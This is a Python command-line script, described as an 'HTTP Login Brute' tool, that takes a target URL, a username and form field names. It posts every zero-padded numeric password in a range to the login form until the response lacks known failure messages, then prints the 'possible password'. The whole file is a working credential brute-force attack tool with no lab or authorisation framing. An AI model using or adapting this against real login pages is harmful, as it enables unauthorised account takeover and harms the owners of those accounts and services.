import requests
import argparse
from bs4 import BeautifulSoup
from colorama import Fore, Style
from time import sleep


SIGNAL = f"{Fore.GREEN}[*]{Style.RESET_ALL}"
class Let:
    def __init__(
        self,
        url: str,
        range_: int,
        zfill: int,
        username: str,
        username_parser: str,
        passwd_parser: str,
        wordlist: str = None
    ):
        self.url = url
        self.range = range_
        self.zfill = zfill
        self.username = username
        self.username_parser = username_parser
        self.passwd_parser = passwd_parser
        self.wordlist = wordlist

    def response_200(self):

        try:

            response = requests.get(self.url)

            #bool : 200
            if response.status_code == 200:
                print(f"{SIGNAL}The connection is successful ""(HTTP Status : 200)."f"{Style.RESET_ALL}")
                sleep(2)
                return response

            else:
                print( f"{Fore.RED}"f"Different res -> {response.status_code}""{Style.RESET_ALL}")

                return None

        except requests.RequestException as e:
            print(f"Unknown Connection Problem: {e}")
            return None

    def process(self):

        response = self.response_200()

        if response is None:
            return

        # zfill
        password_list = [str(i).zfill(self.zfill)for i in range(self.range)]

        for password in password_list:

            data = {self.username_parser: self.username,self.passwd_parser: password}

            try:

                response = requests.post(self.url,data=data,timeout=10)

                if (
                    "Invalid" not in response.text
                    and "Too many attempts" not in response.text
                    and "The email address or password is incorrect"
                    not in response.text
                ):
                    print(f"{SIGNAL}"f"Possible Password: {password}"f"{Style.RESET_ALL}")

                    break

                else:
                    print(f"Attempted -> {password}")

            except requests.RequestException as e:
                print(f"Request Error: {e}")
                break


def main():
    parser = argparse.ArgumentParser(
        description="HTTP Login Brute"
    )
    #arg:??
    parser.add_argument("--url", "-u", required=True, help="Target URL")
    parser.add_argument("--username", required=True, help="Username")
    parser.add_argument("--range", type=int, default=10000, help="Number range")
    parser.add_argument("--zfill", "-zf", type=int, default=4, help="Password digit count")
    parser.add_argument("--username-parser", "--usr", required=True, help="HTML username input name")
    parser.add_argument("--password-parser", "--passwd", required=True, help="HTML password input name")
    args = parser.parse_args()
    login = Let(
        url=args.url,
        range_=args.range,
        zfill=args.zfill,
        username=args.username,
        username_parser=args.username_parser,
        passwd_parser=args.password_parser
    )
    login.process()
if __name__ == "__main__":
    main()
